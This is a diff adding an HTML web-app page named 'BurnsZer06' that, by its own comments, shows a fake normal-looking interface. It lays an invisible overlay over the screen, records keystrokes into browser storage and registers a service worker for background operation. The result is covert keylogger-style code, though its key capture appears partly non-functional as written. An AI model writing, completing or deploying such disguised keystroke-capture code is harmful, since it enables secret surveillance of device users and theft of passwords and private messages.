@@ -1,0 +1,190 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BurnsZer06</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            touch-action: manipulation;
+        }
+        #status {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            font-size: 10px;
+            opacity: 0.5;
+        }
+        #log-container {
+            display: none; /* Hidden by default */
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 999;
+            padding: 10px;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+        .log-entry {
+            word-wrap: break-word;
+            margin-bottom: 5px;
+        }
+        /* Invisible overlay to capture all taps */
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            background: transparent;
+        }
+        /* Fake UI to look like a normal app */
+        #app-ui {
+            position: relative;
+            z-index: 2;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-family: inherit;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Invisible overlay to catch all events -->
+    <div id="overlay"></div>
+
+    <!-- Fake UI -->
+    <div id="app-ui">
+        <h1>BurnsZer06</h1>
+        <p>System Active</p>
+        <button id="toggle-log">View Logs</button>
+    </div>
+
+    <!-- Log Display -->
+    <div id="log-container">
+        <div id="logs"></div>
+        <button id="close-log">Close</button>
+    </div>
+
+    <div id="status">● Online</div>
+
+    <script>
+        // Configuration
+        const LOG_FILE = 'burns_zer06_logs.txt';
+        const MAX_LOG_SIZE = 5000; // Characters before clearing old logs
+
+        // State
+        let isRecording = true;
+        let logBuffer = [];
+
+        // DOM Elements
+        const overlay = document.getElementById('overlay');
+        const logContainer = document.getElementById('log-container');
+        const logsDiv = document.getElementById('logs');
+        const toggleBtn = document.getElementById('toggle-log');
+        const closeLogBtn = document.getElementById('close-log');
+
+        // Event Listeners
+        overlay.addEventListener('keydown', handleKey);
+        overlay.addEventListener('keyup', handleKeyUp);
+        
+        // Touch support for mobile
+        overlay.addEventListener('touchstart', function(e) {
+            // Prevent default to keep focus
+            e.preventDefault();
+        }, {passive: false});
+
+        toggleBtn.addEventListener('click', () => {
+            logContainer.style.display = 'block';
+        });
+
+        closeLogBtn.addEventListener('click', () => {
+            logContainer.style.display = 'none';
+        });
+
+        function handleKey(e) {
+            if (!isRecording) return;
+            
+            const key = e.key;
+            let displayKey = key;
+
+            // Handle special keys
+            if (key === 'Enter') displayKey = '[ENTER]\n';
+            else if (key === 'Backspace') displayKey = '[BS]';
+            else if (key === ' ') displayKey = '_';
+            else if (key === 'Tab') displayKey = '[TAB]';
+            else if (key === 'CapsLock') displayKey = '[CAPS]';
+            else if (key.length > 1) displayKey = `[${key}]`;
+
+            // Add to buffer
+            logBuffer.push(displayKey);
+            
+            // Save to localStorage (persistent storage)
+            saveLogs();
+        }
+
+        function handleKeyUp(e) {
+            // Optional: Add timing data or other post-key actions
+        }
+
+        function saveLogs() {
+            try {
+                const currentLogs = logBuffer.join('');
+                localStorage.setItem('bz_logs', currentLogs.slice(-MAX_LOG_SIZE)); // Keep last N chars
+            } catch (e) {
+                console.error("Storage error", e);
+            }
+        }
+
+        function loadLogs() {
+            const stored = localStorage.getItem('bz_logs');
+            if (stored) {
+                logsDiv.innerHTML = `<pre>${escapeHtml(stored)}</pre>`;
+            }
+        }
+
+        function escapeHtml(text) {
+            return text
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        // Load logs on start
+        loadLogs();
+
+        // Register Service Worker for background capability
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('service-worker.js')
+                    .then(reg => console.log('Service Worker registered'))
+                    .catch(err => console.log('Service Worker failed', err));
+            });
+        }
+    </script>
+</body>
+</html>
